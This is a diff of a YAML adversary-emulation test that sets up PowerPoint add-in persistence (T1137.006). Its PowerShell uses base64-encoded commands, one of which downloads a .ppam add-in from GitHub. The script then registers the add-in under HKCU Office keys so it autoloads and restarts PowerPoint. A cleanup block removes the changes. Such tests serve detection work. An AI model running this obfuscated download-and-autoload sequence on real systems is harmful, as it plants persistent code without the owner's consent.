@@ -1,38 +1,20 @@
-- id: 7ec7131b-0b66-54ea-a0af-348f486dc175
+- requirements: []
   name: Soumaia ART Tests - Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
   description: 'Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started
 
     The sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.'
   tactic: persistence
-  technique:
-    attack_id: T1137.006
-    name: 'Office Application Startup: Add-ins'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBQAG8AdwBlAHIAUABvAGkAbgB0AC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBQAG8AdwBlAHIAUABuAHQAIgAKACAAIABlAHgAaQB0ACAAMAAKAH0AIABjAGEAdABjAGgAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFAAbwB3AGUAcgBQAG8AaQBuAHQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
-          }
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFAAcAB0AFYAQgBBAGEAZABkAGkAbgAuAHAAcABhAG0AIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABBAGQAZABpAG4AcwAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMwA3AC4AMAAwADYALwBiAGkAbgAvAEEAZABkAGkAbgBzAC8AUABwAHQAVgBCAEEAYQBkAGQAaQBuAC4AcABwAGEAbQAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFAAcAB0AFYAQgBBAGEAZABkAGkAbgAuAHAAcABhAG0AIgA=
-          }
-          Copy ".\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam"
-          $ver = (New-Object -COMObject "PowerPoint.Application").version
-          $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"
-          New-Item -type Directory $ExcelRegPath -Force | Out-Null
-          New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null
-          New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null
-          Stop-Process -Name "PowerPnt" -ErrorAction Ignore
-          Start-Process "PowerPnt"
-        cleanup: |-
-          $ver = (New-Object -COMObject "PowerPoint.Application").version
-          Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad" -ErrorAction Ignore
-          Stop-Process -Name "notepad","PowerPnt" -ErrorAction Ignore
-          Start-Sleep 3
-          Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
-        payloads:
-        - Addins
-        - PptVBAaddin.ppam
+  technique_id: T1137.006
+  technique_name: 'Office Application Startup: Add-ins'
+  executors:
+  - cleanup:
+    - $ver = (New-Object -COMObject "PowerPoint.Application").version; Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad" -ErrorAction Ignore; Stop-Process -Name "notepad","PowerPnt" -ErrorAction Ignore; Start-Sleep 3; Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - Addins
+    - PptVBAaddin.ppam
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBQAG8AdwBlAHIAUABvAGkAbgB0AC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuACIAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAIAAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBQAG8AdwBlAHIAUABuAHQAIgAKACAAIABlAHgAaQB0ACAAMAAKAH0AIABjAGEAdABjAGgAIAB7ACAAZQB4AGkAdAAgADEAIAB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFAAbwB3AGUAcgBQAG8AaQBuAHQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA }; powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFAAcAB0AFYAQgBBAGEAZABkAGkAbgAuAHAAcABhAG0AIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABBAGQAZABpAG4AcwAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMwA3AC4AMAAwADYALwBiAGkAbgAvAEEAZABkAGkAbgBzAC8AUABwAHQAVgBCAEEAYQBkAGQAaQBuAC4AcABwAGEAbQAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFAAcAB0AFYAQgBBAGEAZABkAGkAbgAuAHAAcABhAG0AIgA= }; Copy ".\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam"; $ver = (New-Object -COMObject "PowerPoint.Application").version; $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"; New-Item -type Directory $ExcelRegPath -Force | Out-Null; New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null; New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null; Stop-Process -Name "PowerPnt" -ErrorAction Ignore; Start-Process "PowerPnt"
+  id: 7ec7131b-0b66-54ea-a0af-348f486dc175
